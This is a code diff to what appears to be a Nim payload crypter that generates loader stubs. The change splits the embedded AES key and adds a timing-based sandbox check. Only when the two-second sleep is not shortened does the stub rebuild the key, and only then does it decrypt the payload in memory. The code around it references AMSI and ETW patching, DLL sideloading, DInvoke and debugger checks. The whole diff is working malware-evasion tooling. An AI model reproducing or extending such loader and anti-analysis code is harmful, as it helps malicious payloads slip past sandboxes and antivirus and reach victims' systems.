@@ -642,6 +642,14 @@ if (dllclone and dllProxy):
     echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
     quit(1)
 
+#echo "Key: " & envkey
+# Lets save the last 4 characters of the string in a new variable
+var last4 = envkey[^4..^1]
+#echo "Last Four: " & last4
+# And save a key without those last 4 characters in a new one
+var firstwithoutlast4 = envkey.replace(last4, "")
+#echo "First without last 4 :" & firstwithoutlast4
+
 if (peload and embeddedArguments):
     verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
 
@@ -765,6 +773,7 @@ echo "[*] Enctext length: " & $len(enctext)
 
 # Convert Key to byte sequence
 var expandedkey = toByteSeq(envkey)
+
 
 # AES256 key size is 256 bits or 32 bytes, so we need to pad key with
 # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
@@ -1459,7 +1468,13 @@ proc calcHard *(): int =
         if ((rand mod 9) != 0):
             rand += 15
     return rand
+"""
 
+let Cryptstub15 = fmt"""
+var envkey = obf("{firstwithoutlast4}")
+var envkey2 = envkey
+var ptrEncText: ptr byte
+var ptrDecText: ptr byte
 """
 
 let Cryptstub2 = fmt"""
@@ -1472,47 +1487,64 @@ let Cryptstub2 = fmt"""
     discard calcHard()
     var key: array[aes256.sizeKey, byte]
     discard calcHard()
-    var envkey: string = obf("{envkey}")
+
 """
 
 let Cryptstub3 = fmt"""
+    #var envkey2 = envkey & "{last4}"
     
-    var expandedkey = toByteSeq(envkey)
-    discard calcHard()
-    if ((len(expandedkey) mod aes256.sizeBlock) != 0):
-        when defined(verbose):
-            echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
-            echo "[*] Length: " & $len(expandedkey)
-            echo "[*] Padding Key with null bytes"
-        expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
-        when defined(verbose):
-            echo "[*] New Length: " & $len(expandedkey)
-
-    moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
-    discard calcHard()
-    var dectext = newSeq[byte](len(enctext))
-
-    var ptrKey = cast[ptr byte](addr key[0])
-    var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
-    var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
-    let dataLen = uint(len(enctext))
-
-    # Decrypt
-    #dctx.init(ptrKey)
-    #dctx.decrypt(ptrEncText, ptrDecText, dataLen)
-    #dctx.clear()
-
     proc decryptLate(): void =
+        var expandedkey = toByteSeq(envkey2)
+        discard calcHard()
+        if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+            when defined(verbose):
+                echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+                echo "[*] Length: " & $len(expandedkey)
+                echo "[*] Padding Key with null bytes"
+            expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+            when defined(verbose):
+                echo "[*] New Length: " & $len(expandedkey)
+
+        moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
+        discard calcHard()
+        var dectext = newSeq[byte](len(enctext))
+
+        var ptrKey = cast[ptr byte](addr key[0])
+
+        let dataLen = uint(len(enctext))
         when defined(verbose):
             when defined(csharp):
                 echo obf("[!] Decrypting C# Assembly for execution...")
             else:
                 echo obf("[!] Decrypting Payload for execution in memory...")
+        discard calcHard()
         dctx.init(ptrKey)
         discard calcHard()
         dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+        discard calcHard()
         dctx.clear()
 
+"""
+
+let Accelerated_sleepStub * = fmt"""
+
+proc accelerated_sleep*(): void =
+    var 
+        dwStart: DWORD = GetTickCount()
+        dwEnd: DWORD = 0
+    
+    # Lets Sleep for two seconds
+    Sleep(2000)
+    dwEnd = GetTickCount()
+    var dwDiff = dwEnd - dwStart
+    # If we slept for less than 2 seconds, we are in a VM
+    if (dwDiff < 1800):
+        quit(1)
+    else:
+        when defined(verbose):
+            echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
+        envkey2 = envkey & "{last4}"
+accelerated_sleep()
 """
 
 let AmsiNtCreateSectionDecryptStub = fmt"""
@@ -1961,6 +1993,7 @@ if(AmIDebugged()):
 """
 
 var stub = Cryptstub1
+stub.add(Cryptstub15)
 
 if (not noDInvoke):
     stub.add(DInvokeStubfirst)
@@ -2005,6 +2038,7 @@ if(sandbox):
 if (apihide):
     stub.add(APIHideStub)
 
+stub.add(Accelerated_sleepStub)
 
 if(gosleep or remoteETWpatch or remoteAMSIpatch):
     stub.add(SleepStubFirst)
